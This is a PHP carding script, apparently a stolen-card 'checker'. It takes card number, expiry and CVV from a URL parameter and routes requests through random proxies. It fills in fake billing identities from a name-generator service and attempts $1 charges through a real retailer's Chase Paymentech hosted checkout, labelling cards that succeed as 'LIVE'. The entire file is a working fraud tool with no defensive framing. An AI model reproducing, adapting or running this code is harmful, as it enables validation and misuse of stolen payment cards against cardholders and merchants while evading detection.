<?php
    error_reporting(0);
    $time_start = microtime(true);

    function GetStr($string, $start, $end){
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }

    function RandomString($length = 7)
    {
        $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString     = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

    extract($_GET);
    $separator = explode("|", $lista);
    $cc = $separator[0];
    $mm = $separator[1];
    $m = ltrim($mm, "0");
    $yy = $separator[2];
    $cvv = $separator[3];
    $cookie = RandomString();

    $list = file('proxy.txt');
    $proxylist = $list[rand(0, count($list) - 1)];
    $separate = explode(":", $proxylist);
    $proxy = $separate[0];
    $port = $separate[1];
    $proxyUser = $separate[2];
    $proxyPass = $separate[3];

    $randomShits = file_get_contents('https://namegenerator.in/assets/refresh.php?location=united-states');
    $data = json_decode($randomShits, true);
    $fname = explode(" ", $data['name'])[0];
    $lname = explode(" ", $data['name'])[1];
    $email = $data['email']['address'];
    $street = $data['street1'];
    $local = GetStr($randomShits, '"street2":', ',"phone"');
    $city = GetStr($local, '"', ',');
    $state = GetStr($local, ', ', ' ');
    $postcode = GetStr($local, $state." ", '"');
    $phone = str_replace("-", "", $data['phone']);

    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => "https://www.gardeners.com/checkout/RequestChaseId?name=$fname%20$lname&amount=1&orderId=1&customerCountry=USA&customerAddress=".urlencode($street)."&customerCity=".urlencode($city)."&customerState=$state&customerPostalCode=$postcode",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => "",
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_PROXY => $proxy,
        CURLOPT_PROXYPORT => $port,
        CURLOPT_PROXYUSERPWD => $proxyUser.':'.$proxyPass,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => "GET",
        CURLOPT_POSTFIELDS => "",
        CURLOPT_HTTPHEADER => [
            "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
        ],
    ]);
    $_INIT = curl_exec($curl);
    curl_close($curl);

    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => $_INIT,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => "",
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_PROXY => $proxy,
        CURLOPT_PROXYPORT => $port,
        CURLOPT_PROXYUSERPWD => $proxyUser.':'.$proxyPass,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => "GET",
        CURLOPT_POSTFIELDS => "",
        CURLOPT_HTTPHEADER => [
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
        ],
    ]);
    $_SID = GetStr(curl_exec($curl), 'var sid = "', '"');
    curl_close($curl);

    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => "https://www.chasepaymentechhostedpay.com/hpf/1_1/iframeprocessor.php",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => "",
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_PROXY => $proxy,
        CURLOPT_PROXYPORT => $port,
        CURLOPT_PROXYUSERPWD => $proxyUser.':'.$proxyPass,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => "POST",
        CURLOPT_POSTFIELDS => "action=tracer&sid=$_SID",
        CURLOPT_HTTPHEADER => [
            "Accept: */*",
            "Content-type: application/x-www-form-urlencoded",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
        ],
    ]);
    $_TRACER = curl_exec($curl);
    curl_close($curl);

    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => "https://www.chasepaymentechhostedpay.com/hpf/1_1/iframeprocessor.php",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => "",
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_PROXY => $proxy,
        CURLOPT_PROXYPORT => $port,
        CURLOPT_PROXYUSERPWD => $proxyUser.':'.$proxyPass,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => "POST",
        CURLOPT_POSTFIELDS => "sessionId=$_SID&amount=1.00&required=all&uIDTrans=1&tdsApproved=&tracer=$_TRACER&completeStatus=0&sid=$_SID&sid=$_SID&currency_code=USD&cbOverride=1&name=$fname%2520$lname&amountDisplay=USD%2520%25241.00&ccNumber=$cc&CVV2=$cvv&ccType=Visa&expMonth=$mm&expYear=$yy&action=process",
        CURLOPT_HTTPHEADER => [
            "Accept: */*",
            "Content-type: application/x-www-form-urlencoded",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
        ],
    ]);
    $_EXEC = curl_exec($curl);
    curl_close($curl);

    $response = urldecode(GetStr($_EXEC, '"gatewayMessage":"', '"'));

    if (strpos($_EXEC, 'Success')) {

        echo '<tr><td><span class="badge badge-success badge-pill">LIVE</span></td><td><span> => </span></td><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td> <td><span class="badge badge-success badge-pill">Charged $1</span></td></tr><br>';

    } else {

        echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">'.$response.'</span></td> <td><span class="badge badge-info badge-pill">Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';

    }
    unlink("$cookie.txt");
?>